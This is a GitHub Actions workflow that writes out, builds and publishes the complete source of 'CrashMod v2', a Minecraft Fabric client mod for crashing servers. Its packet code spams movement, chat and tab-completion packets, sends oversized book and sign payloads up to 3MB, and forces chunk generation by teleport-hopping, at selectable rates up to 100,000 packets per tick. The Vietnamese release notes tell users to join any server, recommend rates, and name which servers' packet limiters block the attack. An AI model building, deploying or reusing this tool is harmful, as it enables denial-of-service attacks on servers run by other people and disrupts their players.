# ============================================================================
#  CrashMod v2 - "BA VUONG"  |  client-only, khong can cai len server
#  Gradle 9.2.0 + loom 1.15.5 (khop plugin.api-version)
# ============================================================================
name: CrashMod CI

on:
  push:
    branches: [ main, master ]
    tags: [ 'v*' ]
  pull_request:
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: crashmod-${{ github.ref }}
  cancel-in-progress: true

env:
  GRADLE_VERSION: '9.2.0'
  PRIMARY_MC: '1.21.11'

jobs:

  # ==========================================================================
  # JOB 1 - PREPARE
  # ==========================================================================
  prepare:
    name: Prepare - tu tao file
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'

      - uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: '9.2.0'

      - name: Tao file
        run: |
          set -euo pipefail
          mkdir -p src/main/java/vn/venice/crashmod/net \
                   src/main/java/vn/venice/crashmod/client \
                   src/main/resources/assets/crashmod/lang run

          if [ ! -f gradle.properties ]; then
          cat > gradle.properties <<'EOF'
          org.gradle.jvmargs=-Xmx2G
          org.gradle.parallel=true
          minecraft_version=1.21.11
          yarn_mappings=1.21.11+build.1
          loader_version=0.17.2
          fabric_version=0.141.6+1.21.11
          minecraft_range=~1.21
          mod_version=2.0.0
          maven_group=vn.venice.crashmod
          archives_base_name=crashmod
          EOF
          fi

          if [ ! -f settings.gradle ]; then
          cat > settings.gradle <<'EOF'
          pluginManagement {
              repositories {
                  maven { name = 'Fabric'; url = 'https://maven.fabricmc.net/' }
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          rootProject.name = 'crashmod'
          EOF
          fi

          if [ ! -f build.gradle ]; then
          cat > build.gradle <<'EOF'
          plugins {
              id 'fabric-loom' version '1.15.5'
              id 'maven-publish'
          }

          def mcVersion     = (findProperty('minecraft_version') ?: '1.21.11').toString()
          def yarnVersion   = (findProperty('yarn_mappings')     ?: "${mcVersion}+build.1").toString()
          def loaderVersion = (findProperty('loader_version')    ?: '0.17.2').toString()
          def fabricVersion = (findProperty('fabric_version')    ?: "0.141.6+${mcVersion}").toString()
          def mcRange       = (findProperty('minecraft_range')   ?: '~1.21').toString()

          version = project.mod_version
          group   = project.maven_group
          base { archivesName = "${project.archives_base_name}-${mcVersion}" }

          repositories { maven { url = 'https://maven.fabricmc.net/' } }

          dependencies {
              minecraft "com.mojang:minecraft:${mcVersion}"
              mappings  "net.fabricmc:yarn:${yarnVersion}:v2"
              modImplementation "net.fabricmc:fabric-loader:${loaderVersion}"
              modImplementation "net.fabricmc.fabric-api:fabric-api:${fabricVersion}"
          }

          processResources {
              inputs.property 'version', project.version
              inputs.property 'minecraft_range', mcRange
              filesMatching('fabric.mod.json') {
                  expand 'version': project.version, 'minecraft_range': mcRange
              }
          }

          tasks.withType(JavaCompile).configureEach {
              options.encoding = 'UTF-8'
              options.release = 21
          }

          java {
              withSourcesJar()
              sourceCompatibility = JavaVersion.VERSION_21
              targetCompatibility = JavaVersion.VERSION_21
          }

          jar { from('LICENSE') { rename { "${it}_${project.base.archivesName.get()}" } } }
          EOF
          fi

          if [ ! -f src/main/resources/fabric.mod.json ]; then
          cat > src/main/resources/fabric.mod.json <<'EOF'
          {
            "schemaVersion": 1,
            "id": "crashmod",
            "version": "${version}",
            "name": "CrashMod",
            "description": "Shift+M mo GUI bat/tat. Book NBT bomb + chunk hop + resync combo.",
            "authors": [ "Venice" ],
            "license": "MIT",
            "environment": "*",
            "entrypoints": {
              "main":   [ "vn.venice.crashmod.CrashMod" ],
              "client": [ "vn.venice.crashmod.client.CrashModClient" ]
            },
            "depends": {
              "fabricloader": ">=0.15.0",
              "fabric-api": "*",
              "minecraft": "${minecraft_range}",
              "java": ">=21"
            }
          }
          EOF
          fi

          [ -f src/main/resources/assets/crashmod/lang/vi_vn.json ] || \
            printf '{ "key.crashmod.open": "Mo GUI CrashMod", "category.crashmod": "CrashMod" }\n' \
              > src/main/resources/assets/crashmod/lang/vi_vn.json
          [ -f src/main/resources/assets/crashmod/lang/en_us.json ] || \
            printf '{ "key.crashmod.open": "Open CrashMod GUI", "category.crashmod": "CrashMod" }\n' \
              > src/main/resources/assets/crashmod/lang/en_us.json

          [ -f .gitignore ] || printf '.gradle/\nbuild/\nrun/\nout/\n.idea/\n*.iml\n.vscode/\n' > .gitignore
          [ -f LICENSE ]    || printf 'MIT License\n\nCopyright (c) 2026 Venice\n' > LICENSE

          printf 'eula=true\n' > run/eula.txt
          printf 'online-mode=false\nmax-players=2\nview-distance=4\nlevel-type=flat\n' > run/server.properties

          # ======================= SOURCE CODE ======================= #

          if [ ! -f src/main/java/vn/venice/crashmod/CrashMod.java ]; then
          cat > src/main/java/vn/venice/crashmod/CrashMod.java <<'EOF'
          package vn.venice.crashmod;

          import net.fabricmc.api.ModInitializer;
          import org.slf4j.Logger;
          import org.slf4j.LoggerFactory;

          public class CrashMod implements ModInitializer {
              public static final Logger LOGGER = LoggerFactory.getLogger("CrashMod");
              @Override
              public void onInitialize() {
                  LOGGER.info("[CrashMod] da nap");
              }
          }
          EOF
          fi

          if [ ! -f src/main/java/vn/venice/crashmod/CrashRegistry.java ]; then
          cat > src/main/java/vn/venice/crashmod/CrashRegistry.java <<'EOF'
          package vn.venice.crashmod;

          import java.util.List;

          public final class CrashRegistry {

              private CrashRegistry() {}

              public record Mode(String id, String label, int code) {}

              public static final List<Integer> RATES = List.of(
                      1, 2, 5, 10, 20, 50, 100, 250, 500, 1000,
                      2500, 5000, 10000, 50000, 100000);

              // FLOOD = re tien, spam so luong lon
              // BOMB  = dat tien, work moi packet khong lo
              public static final List<Mode> MODES = List.of(
                      new Mode("swing",      "Swing",       1),
                      new Mode("look",       "Look",        2),
                      new Mode("move",       "Move",        3),
                      new Mode("abilities",  "Abilities",   4),
                      new Mode("shift",      "Shift",       5),
                      new Mode("sprint",     "Sprint",      6),
                      new Mode("close_gui",  "Dong GUI",    7),
                      new Mode("slot",       "Doi slot",    8),
                      new Mode("drop",       "Drop item",   9),
                      new Mode("chat",       "Chat",       10),
                      new Mode("command",    "Cmd sai",    11),
                      new Mode("payload",    "Payload",    12),
                      new Mode("click",      "Click inv",  13),
                      new Mode("tab",        "Tab",        14),
                      new Mode("tab_long",   "Tab dai",    15),
                      new Mode("book_s",     "Book 25KB",  16),
                      new Mode("book_m",     "Book 100KB", 17),
                      new Mode("book_x",     "Book 3MB",   18),
                      new Mode("sign",       "Sign bomb",  19),
                      new Mode("chunk_hop",  "Chunk hop",  20),
                      new Mode("move_chaos", "Move loan",  21),
                      new Mode("slot_flip",  "Lat slot",   22),
                      new Mode("book_click", "Book+Click", 23),
                      new Mode("nuke",       "NUKE",       24)
              );

              public static int codeOf(String id) {
                  for (Mode m : MODES) if (m.id().equals(id)) return m.code();
                  return 0;
              }
          }
          EOF
          fi

          if [ ! -f src/main/java/vn/venice/crashmod/Config.java ]; then
          cat > src/main/java/vn/venice/crashmod/Config.java <<'EOF'
          package vn.venice.crashmod;

          import net.fabricmc.loader.api.FabricLoader;

          import java.io.InputStream;
          import java.io.OutputStream;
          import java.nio.file.Files;
          import java.nio.file.Path;
          import java.util.LinkedHashSet;
          import java.util.List;
          import java.util.Properties;
          import java.util.Set;

          public final class Config {

              private Config() {}

              private static final Path FILE =
                      FabricLoader.getInstance().getConfigDir().resolve("crashmod.properties");

              public static int rateIndex = 6;
              public static final Set<String> enabled = new LinkedHashSet<>();
              public static int[] activeCodes = new int[0];

              public static int rate() { return CrashRegistry.RATES.get(rateIndex); }
              public static boolean isOn(String id) { return enabled.contains(id); }

              public static void toggle(String id) {
                  if (!enabled.remove(id)) enabled.add(id);
                  changed();
              }

              public static void setAll(boolean on) {
                  enabled.clear();
                  if (on) for (CrashRegistry.Mode m : CrashRegistry.MODES) enabled.add(m.id());
                  changed();
              }

              public static void killPreset() {
                  enabled.clear();
                  enabled.addAll(List.of("book_click", "click", "chunk_hop", "drop", "tab_long"));
                  rateIndex = CrashRegistry.RATES.indexOf(100);
                  changed();
              }

              public static void bumpRate(int d) {
                  rateIndex = Math.max(0, Math.min(CrashRegistry.RATES.size() - 1, rateIndex + d));
                  changed();
              }

              private static void changed() { rebuild(); save(); }

              private static void rebuild() {
                  activeCodes = enabled.stream()
                          .mapToInt(CrashRegistry::codeOf)
                          .filter(c -> c > 0)
                          .toArray();
              }

              public static void load() {
                  if (Files.isRegularFile(FILE)) {
                      Properties p = new Properties();
                      try (InputStream in = Files.newInputStream(FILE)) {
                          p.load(in);
                          rateIndex = Math.max(0, Math.min(CrashRegistry.RATES.size() - 1,
                                  Integer.parseInt(p.getProperty("rateIndex", "6"))));
                          enabled.clear();
                          for (String s : p.getProperty("enabled", "").split(",")) {
                              if (!s.isBlank()) enabled.add(s.trim());
                          }
                      } catch (Exception ignored) { }
                  }
                  rebuild();
              }

              public static void save() {
                  Properties p = new Properties();
                  p.setProperty("rateIndex", String.valueOf(rateIndex));
                  p.setProperty("enabled", String.join(",", enabled));
                  try {
                      Files.createDirectories(FILE.getParent());
                      try (OutputStream out = Files.newOutputStream(FILE)) {
                          p.store(out, "CrashMod - mode dang bat");
                      }
                  } catch (Exception ignored) { }
              }
          }
          EOF
          fi

          if [ ! -f src/main/java/vn/venice/crashmod/net/FloodPayload.java ]; then
          cat > src/main/java/vn/venice/crashmod/net/FloodPayload.java <<'EOF'
          package vn.venice.crashmod.net;

          import net.minecraft.network.RegistryByteBuf;
          import net.minecraft.network.codec.PacketCodec;
          import net.minecraft.network.packet.CustomPayload;
          import net.minecraft.util.Identifier;

          public record FloodPayload() implements CustomPayload {

              public static final FloodPayload INSTANCE = new FloodPayload();

              public static final CustomPayload.Id<FloodPayload> ID =
                      new CustomPayload.Id<>(Identifier.of("crashmod", "flood"));

              public static final PacketCodec<RegistryByteBuf, FloodPayload> CODEC =
                      PacketCodec.unit(INSTANCE);

              @Override
              public CustomPayload.Id<? extends CustomPayload> getId() { return ID; }
          }
          EOF
          fi

          if [ ! -f src/main/java/vn/venice/crashmod/client/Packets.java ]; then
          cat > src/main/java/vn/venice/crashmod/client/Packets.java <<'EOF'
          package vn.venice.crashmod.client;

          import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
          import net.minecraft.client.MinecraftClient;
          import net.minecraft.client.network.ClientPlayerEntity;
          import net.minecraft.item.ItemStack;
          import net.minecraft.item.Items;
          import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
          import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
          import net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket;
          import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
          import net.minecraft.network.packet.c2s.play.CloseHandledScreenC2SPacket;
          import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
          import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
          import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
          import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
          import net.minecraft.network.packet.c2s.play.UpdatePlayerAbilitiesC2SPacket;
          import net.minecraft.network.packet.c2s.play.UpdateSelectedSlotC2SPacket;
          import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
          import net.minecraft.screen.slot.SlotActionType;
          import net.minecraft.text.Text;
          import net.minecraft.util.Hand;
          import net.minecraft.util.math.BlockPos;
          import net.minecraft.util.math.Direction;
          import vn.venice.crashmod.net.FloodPayload;

          import java.util.ArrayList;
          import java.util.List;
          import java.util.Optional;

          public final class Packets {

              private Packets() {}

              private static int tx = 0;
              private static final String LONG_CMD  = "/" + "a".repeat(2000);
              private static final String SIGN_LINE = "A".repeat(384);

              private static final List<String> BOOK_25K  = book(100, 255);
              private static final List<String> BOOK_100K = book(100, 1000);
              private static final List<String> BOOK_3M   = book(100, 32767);

              private static List<String> book(int pages, int chars) {
                  String unit = "A".repeat(chars);
                  List<String> out = new ArrayList<>(pages);
                  for (int i = 0; i < pages; i++) out.add(unit);
                  return out;
              }

              /** 1.21.9+ getSelectedSlot()  |  <= 1.21.8 doi thanh .selectedSlot */
              private static int sel(ClientPlayerEntity p) {
                  return p.getInventory().getSelectedSlot();
              }

              public static boolean holdingBook(ClientPlayerEntity p) {
                  return p.getInventory().getStack(sel(p)).isOf(Items.WRITABLE_BOOK);
              }

              private static double hopX = Double.NaN, hopZ = 0;

              public static void send(MinecraftClient client, int code) {
                  ClientPlayerEntity p = client.player;
                  if (p == null || p.networkHandler == null) return;
                  tx++;

                  switch (code) {

                      // ---------------- FLOOD ----------------
                      case 1 -> p.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));

                      case 2 -> p.networkHandler.sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(
                              p.getYaw(), p.getPitch(), true, false));

                      case 3 -> p.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(
                              p.getX(), p.getY(), p.getZ(), p.getYaw(), p.getPitch(), true, false));

                      case 4 -> p.networkHandler.sendPacket(
                              new UpdatePlayerAbilitiesC2SPacket(p.getAbilities()));

                      case 5 -> p.networkHandler.sendPacket(new ClientCommandC2SPacket(
                              p, ClientCommandC2SPacket.Mode.PRESS_SHIFT_KEY));

                      case 6 -> p.networkHandler.sendPacket(new ClientCommandC2SPacket(
                              p, ClientCommandC2SPacket.Mode.START_SPRINTING));

                      case 7 -> p.networkHandler.sendPacket(
                              new CloseHandledScreenC2SPacket(p.currentScreenHandler.syncId));

                      case 8 -> p.networkHandler.sendPacket(new UpdateSelectedSlotC2SPacket(tx % 9));

                      case 9 -> p.networkHandler.sendPacket(new PlayerActionC2SPacket(
                              PlayerActionC2SPacket.Action.DROP_ITEM, BlockPos.ORIGIN, Direction.DOWN));

                      case 10 -> p.networkHandler.sendChatMessage("CrashMod " + tx);

                      case 11 -> p.networkHandler.sendCommand("crashmod" + tx);

                      case 12 -> p.networkHandler.sendPacket(
                              new CustomPayloadC2SPacket(FloodPayload.INSTANCE));

                      // ---------------- BOMB ----------------
                      case 13 -> click(p);

                      case 14 -> p.networkHandler.sendPacket(
                              new RequestCommandCompletionsC2SPacket(tx, "/"));

                      case 15 -> p.networkHandler.sendPacket(
                              new RequestCommandCompletionsC2SPacket(tx, LONG_CMD));

                      case 16 -> book(p, BOOK_25K);
                      case 17 -> book(p, BOOK_100K);
                      case 18 -> book(p, BOOK_3M);

                      case 19 -> {
                          BlockPos pos = BlockPos.ofFloored(p.getX(), p.getY(), p.getZ());
                          // <= 1.21.8 neu loi compile: doi thanh (pos, true, L, L, L, L)
                          p.networkHandler.sendPacket(new UpdateSignC2SPacket(
                                  pos, true, new String[]{SIGN_LINE, SIGN_LINE, SIGN_LINE, SIGN_LINE}));
                      }

                      // ---------------- CHUNK ----------------
                      case 20 -> {
                          if (Double.isNaN(hopX)) { hopX = p.getX(); hopZ = p.getZ(); }
                          hopX += 8.0;
                          if (hopX > 15000.0) { hopX = -15000.0; hopZ += 512.0; }
                          p.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(
                                  hopX, p.getY(), hopZ, p.getYaw(), p.getPitch(), true, false));
                      }

                      case 21 -> p.networkHandler.sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(
                              (float) (Math.random() * 720.0 - 360.0),
                              (float) (Math.random() * 180.0 - 90.0), true, false));

                      case 22 -> p.networkHandler.sendPacket(
                              new UpdateSelectedSlotC2SPacket(tx % 2 == 0 ? 0 : 8));

                      // ---------------- COMBO ----------------
                      case 23 -> {
                          if (tx % 100 == 0) book(p, BOOK_100K);
                          click(p);
                      }

                      case 24 -> {
                          int[] ring = {1, 2, 3, 4, 5, 7, 9, 10, 13, 14, 15, 20, 21};
                          send(client, ring[tx % ring.length]);
                      }

                      default -> { }
                  }
              }

              private static void click(ClientPlayerEntity p) {
                  p.networkHandler.sendPacket(new ClickSlotC2SPacket(
                          p.currentScreenHandler.syncId,
                          0,
                          0, 0,
                          SlotActionType.PICKUP,
                          ItemStack.EMPTY,
                          new Int2ObjectArrayMap<>()));
              }

              private static void book(ClientPlayerEntity p, List<String> pages) {
                  p.networkHandler.sendPacket(new BookUpdateC2SPacket(
                          sel(p), pages, Optional.<Text>empty()));
              }
          }
          EOF
          fi

          if [ ! -f src/main/java/vn/venice/crashmod/client/CrashModClient.java ]; then
          cat > src/main/java/vn/venice/crashmod/client/CrashModClient.java <<'EOF'
          package vn.venice.crashmod.client;

          import net.fabricmc.api.ClientModInitializer;
          import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
          import net.fabricmc.fabric.api.client.keybinding.v1.KeyBindingHelper;
          import net.minecraft.client.MinecraftClient;
          import net.minecraft.client.option.KeyBinding;
          import net.minecraft.client.util.InputUtil;
          import org.lwjgl.glfw.GLFW;
          import vn.venice.crashmod.Config;

          public class CrashModClient implements ClientModInitializer {

              public static KeyBinding openKey;

              @Override
              public void onInitializeClient() {
                  Config.load();

                  openKey = KeyBindingHelper.registerKeyBinding(new KeyBinding(
                          "key.crashmod.open", InputUtil.Type.KEYSYM,
                          GLFW.GLFW_KEY_M, "category.crashmod"));

                  ClientTickEvents.END_CLIENT_TICK.register(client -> {
                      while (openKey.wasPressed()) {
                          if (client.currentScreen == null) client.setScreen(new ToggleScreen());
                      }
                      tick(client);
                  });
              }

              private static void tick(MinecraftClient client) {
                  int[] codes = Config.activeCodes;
                  if (codes.length == 0) return;
                  if (client.player == null || client.getNetworkHandler() == null) return;

                  int rate = Config.rate();
                  for (int code : codes) {
                      for (int i = 0; i < rate; i++) Packets.send(client, code);
                  }
              }
          }
          EOF
          fi

          if [ ! -f src/main/java/vn/venice/crashmod/client/ToggleScreen.java ]; then
          cat > src/main/java/vn/venice/crashmod/client/ToggleScreen.java <<'EOF'
          package vn.venice.crashmod.client;

          import net.minecraft.client.MinecraftClient;
          import net.minecraft.client.gui.screen.Screen;
          import net.minecraft.client.gui.widget.ButtonWidget;
          import net.minecraft.client.gui.widget.TextWidget;
          import net.minecraft.text.Text;
          import vn.venice.crashmod.Config;
          import vn.venice.crashmod.CrashRegistry;

          public class ToggleScreen extends Screen {

              public ToggleScreen() { super(Text.literal("CrashMod v2")); }

              private static void rebuild() {
                  MinecraftClient.getInstance().setScreen(new ToggleScreen());
              }

              private static Text label(CrashRegistry.Mode m) {
                  return Text.literal(Config.isOn(m.id())
                          ? "\u00a7a[x] \u00a7f" + m.label()
                          : "\u00a78[ ] \u00a77" + m.label());
              }

              @Override
              protected void init() {
                  int cols = 3, colW = 112, h = 18, gapX = 6, gapY = 2;
                  int totalW = cols * colW + (cols - 1) * gapX;
                  int startX = this.width / 2 - totalW / 2;

                  MinecraftClient mc = MinecraftClient.getInstance();
                  boolean hasBook = mc.player != null && Packets.holdingBook(mc.player);

                  addDrawableChild(new TextWidget(startX, 6, totalW, 10,
                          Text.literal("\u00a77Shift+M  \u00a78|  \u00a7abat: \u00a7f"
                                  + Config.enabled.size() + "  \u00a78|  \u00a7arate: \u00a7f"
                                  + Config.rate() + " pkt/tick"),
                          mc.textRenderer).alignCenter());

                  addDrawableChild(new TextWidget(startX, 16, totalW, 10,
                          Text.literal(hasBook
                                  ? "\u00a7asach tren tay: CO  \u00a78(book bomb san sang)"
                                  : "\u00a7csach tren tay: KHONG  \u00a78(cam sach+but de dung book bomb)"),
                          mc.textRenderer).alignCenter());

                  int i = 0;
                  for (CrashRegistry.Mode m : CrashRegistry.MODES) {
                      final CrashRegistry.Mode mode = m;
                      int x = startX + (i % cols) * (colW + gapX);
                      int y = 30 + (i / cols) * (h + gapY);
                      addDrawableChild(ButtonWidget.builder(label(mode), b -> {
                          Config.toggle(mode.id());
                          rebuild();
                      }).dimensions(x, y, colW, h).build());
                      i++;
                  }

                  int sy = 30 + 8 * (h + gapY) + 6;

                  addDrawableChild(ButtonWidget.builder(Text.literal("\u00a7c-"), b -> {
                      Config.bumpRate(-1); rebuild();
                  }).dimensions(startX, sy, 30, 20).build());

                  addDrawableChild(ButtonWidget.builder(Text.literal("\u00a7a+"), b -> {
                      Config.bumpRate(1); rebuild();
                  }).dimensions(startX + 34, sy, 30, 20).build());

                  addDrawableChild(ButtonWidget.builder(Text.literal("\u00a7dKILL"), b -> {
                      Config.killPreset(); rebuild();
                  }).dimensions(startX + 68, sy, 76, 20).build());

                  addDrawableChild(ButtonWidget.builder(Text.literal("BAT HET"), b -> {
                      Config.setAll(true); rebuild();
                  }).dimensions(startX + 148, sy, 76, 20).build());

                  addDrawableChild(ButtonWidget.builder(Text.literal("TAT HET"), b -> {
                      Config.setAll(false); rebuild();
                  }).dimensions(startX + 228, sy, 76, 20).build());

                  addDrawableChild(ButtonWidget.builder(Text.literal("Dong"), b -> close())
                          .dimensions(startX + 308, sy, 40, 20).build());
              }
          }
          EOF
          fi

          echo "=== FILES ==="
          find src -type f | sort

      - name: Tao gradle wrapper (LUON ghi lai, khong dung [ -f ])
        run: |
          set -euo pipefail
          gradle wrapper --gradle-version "${GRADLE_VERSION}" --no-daemon
          chmod +x gradlew
          echo "--- gradle-wrapper.properties ---"
          cat gradle/wrapper/gradle-wrapper.properties

      - uses: actions/upload-artifact@v4
        with:
          name: source
          retention-days: 3
          path: |
            build.gradle
            settings.gradle
            gradle.properties
            gradlew
            gradlew.bat
            gradle/
            src/
            LICENSE
            .gitignore
            run/

  # ==========================================================================
  # JOB 2 - BUILD
  # ==========================================================================
  build:
    name: Build ${{ matrix.mc }}
    needs: prepare
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        include:
          - { mc: '1.21.11', yarn: '1.21.11+build.1', fabric: '0.141.6+1.21.11' }
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'

      - uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: '9.2.0'

      - uses: actions/download-artifact@v4
        with:
          name: source

      - name: Build
        run: |
          set -euo pipefail
          gradle build --no-daemon --console=plain --stacktrace \
            -Pminecraft_version=${{ matrix.mc }} \
            -Pyarn_mappings=${{ matrix.yarn }} \
            -Pfabric_version=${{ matrix.fabric }}

      - name: Validate jar
        run: |
          set -euo pipefail
          python3 - <<'PY'
          import glob, json, os, zipfile
          jars = [j for j in glob.glob("build/libs/*.jar") if "sources" not in j]
          if not jars: raise SystemExit("!! khong co jar")
          jar = max(jars, key=os.path.getsize)
          need = ["fabric.mod.json",
                  "vn/venice/crashmod/CrashMod.class",
                  "vn/venice/crashmod/Config.class",
                  "vn/venice/crashmod/CrashRegistry.class",
                  "vn/venice/crashmod/client/CrashModClient.class",
                  "vn/venice/crashmod/client/Packets.class",
                  "vn/venice/crashmod/client/ToggleScreen.class"]
          with zipfile.ZipFile(jar) as z:
              names = set(z.namelist())
              for n in need:
                  if n not in names: raise SystemExit(f"!! thieu {n}")
              m = json.loads(z.read("fabric.mod.json"))
              assert m["id"] == "crashmod"
              assert "client" in m["entrypoints"]
          print("OK ->", jar, os.path.getsize(jar), "bytes")
          PY

      - uses: actions/upload-artifact@v4
        with:
          name: crashmod-jar
          path: |
            build/libs/*.jar
            !build/libs/*-sources.jar

  # ==========================================================================
  # JOB 3 - SMOKE TEST
  # ==========================================================================
  smoke-test:
    name: Smoke test
    needs: build
    runs-on: ubuntu-latest
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'

      - uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: '9.2.0'

      - uses: actions/download-artifact@v4
        with:
          name: source

      - name: Chay dedicated server headless
        run: |
          set -uo pipefail
          mkdir -p run
          echo "eula=true" > run/eula.txt
          printf 'online-mode=false\nmax-players=2\nview-distance=4\nlevel-type=flat\n' > run/server.properties
          rm -rf run/logs || true

          gradle runServer --no-daemon --console=plain > stdout.log 2>&1 &
          GPID=$!

          OK=0
          for i in $(seq 1 150); do
            grep -qs "CrashMod\] da nap" run/logs/latest.log && { OK=1; break; }
            sleep 4
          done

          tail -n 30 run/logs/latest.log 2>/dev/null || tail -n 30 stdout.log || true
          pkill -f devlaunchinjector || true
          kill "$GPID" 2>/dev/null || true
          sleep 2

          [ "$OK" = "1" ] || { echo "!! SMOKE TEST FAIL"; exit 1; }
          echo ">> SMOKE TEST PASS"

      - uses: actions/upload-artifact@v4
        if: failure()
        with:
          name: smoke-logs
          if-no-files-found: ignore
          path: |
            run/logs/latest.log
            stdout.log

  # ==========================================================================
  # JOB 4 - RELEASE
  # ==========================================================================
  release:
    name: Release
    needs: [ build, smoke-test ]
    if: >-
      always() && !cancelled()
      && github.event_name != 'pull_request'
      && needs.build.result == 'success'
      && needs.smoke-test.result == 'success'
      && (startsWith(github.ref, 'refs/tags/v') || github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master' || github.event_name == 'workflow_dispatch')
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Meta
        id: meta
        run: |
          set -euo pipefail
          SHORT=$(echo "${GITHUB_SHA}" | cut -c1-7)
          if [[ "${GITHUB_REF}" == refs/tags/v* ]]; then
            echo "tag=${GITHUB_REF#refs/tags/}"           >> "$GITHUB_OUTPUT"
            echo "name=CrashMod ${GITHUB_REF#refs/tags/}" >> "$GITHUB_OUTPUT"
            echo "pre=false"                              >> "$GITHUB_OUTPUT"
            echo "latest=true"                            >> "$GITHUB_OUTPUT"
          else
            echo "tag=nightly"                            >> "$GITHUB_OUTPUT"
            echo "name=CrashMod nightly (${SHORT})"       >> "$GITHUB_OUTPUT"
            echo "pre=true"                               >> "$GITHUB_OUTPUT"
            echo "latest=false"                           >> "$GITHUB_OUTPUT"
          fi

      - uses: actions/download-artifact@v4
        with:
          pattern: 'crashmod-jar'
          path: dist
          merge-multiple: true

      - name: Checksum
        run: |
          set -euo pipefail
          mkdir -p dist && cd dist
          ls *.jar >/dev/null || { echo "!! khong co jar"; exit 1; }
          sha256sum *.jar > checksums.txt
          cat checksums.txt

      - name: Notes
        run: |
          cat > dist/NOTES.md <<'EOF'
          ## CrashMod v2

          Client-only. Khong can cai len server. Chi Fabric Loader + Fabric API o client.

          ### Dung
          1. Bo jar vao `.minecraft/mods/`.
          2. Vao bat ky server nao.
          3. Bam **Shift + M** -> bat/tat cac mode.

          ### Book NBT bomb - vu khi chinh
          Cam **sach va but** tren tay, bat `Book 100KB` hoac `Book 3MB`.
          Moi packet = 1 cuon sach 100KB-3MB. Server phai deserialize NBT,
          luu vao item, roi gui tra lai trong goi sync inventory. 1 vao ~ 1 ra.
          Khong phu thuoc packet-limiter.

          `Book+Click`: sach 100KB + click revision sai -> server vua nuot sach
          vua phai syncState() tra full inventory.

          ### Chunk hop
          Dich chuyen 8 block moi packet. Server phai load/generate chunk doc duong.

          ### Preset KILL
          Bat: book_click + click + chunk_hop + drop + tab_long, rate 100.

          ### Rate goi y
          - Flood (swing/look/move): 1000-10000
          - Book don le: 1-5
          - Book+Click: 50-200
          - Chunk hop: 10-100

          ### Luu y
          Paper/Spigot mac dinh co packet-limiter 500 packet / 7 giay -> bi KICK.
          Vanilla server hoac server tat limiter -> flood moi crash duoc.
          EOF

      - uses: softprops/action-gh-release@v2
        with:
          tag_name: ${{ steps.meta.outputs.tag }}
          name: ${{ steps.meta.outputs.name }}
          body_path: dist/NOTES.md
          prerelease: ${{ steps.meta.outputs.pre }}
          make_latest: ${{ steps.meta.outputs.latest }}
          fail_on_unmatched_files: true
          files: |
            dist/*.jar
            dist/checksums.txt
